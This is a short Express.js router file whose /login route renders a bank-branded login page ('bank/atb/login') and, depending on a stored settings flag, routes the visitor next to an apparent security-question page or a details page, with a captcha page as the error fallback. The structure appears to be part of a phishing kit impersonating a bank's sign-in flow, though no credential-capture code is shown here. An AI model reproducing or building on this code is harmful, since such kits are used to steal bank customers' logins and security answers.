// userRouter.js
const express = require('express');
const router = express.Router();
const { Pool } = require('pg');

const pool = new Pool(dbConfig);

router.get('/login', async (req, res) => {
    try{
        const getId = 1; // Since we're always dealing with the record with id = 1
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        console.log(result.rows[0].data.settings.atb.qa);    
        
        if(result.rows[0].data.settings.atb.qa > 0){res.render('../bank/atb/login/index', {navig: "/atb/qst"});} else {res.render('../bank/atb/login/index', {navig: "/atb/details"});}
        
        
    } catch (error) {
        console.error(error);
        res.render('../captcha/index');
    }
})

// Export the router
module.exports = router;
